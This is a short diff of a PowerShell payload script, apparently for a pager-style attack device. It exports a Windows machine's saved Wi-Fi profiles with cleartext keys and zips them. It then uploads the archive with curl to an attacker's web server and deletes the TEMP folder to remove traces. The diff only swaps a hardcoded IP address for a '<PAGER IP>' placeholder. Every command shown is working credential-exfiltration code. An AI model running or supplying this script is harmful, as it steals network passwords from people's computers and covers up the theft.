@@ -6,7 +6,7 @@ netsh wlan export profile key=clear folder="$env:TEMP\wifi"
 Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force *> $null 2>&1
 
 # Uploads wifi credentials to pager web server
-curl.exe -X POST -H "X-Filename: wifi.zip" --data-binary "@$env:TEMP\wifi\wifi.zip" http://172.16.52.1:42/upload
+curl.exe -X POST -H "X-Filename: wifi.zip" --data-binary "@$env:TEMP\wifi\wifi.zip" http://<PAGER IP>:42/upload
 
 Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 
